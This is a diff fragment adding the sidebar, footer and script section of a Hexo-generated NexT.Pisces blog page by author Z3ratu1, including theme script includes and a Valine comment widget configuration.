+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
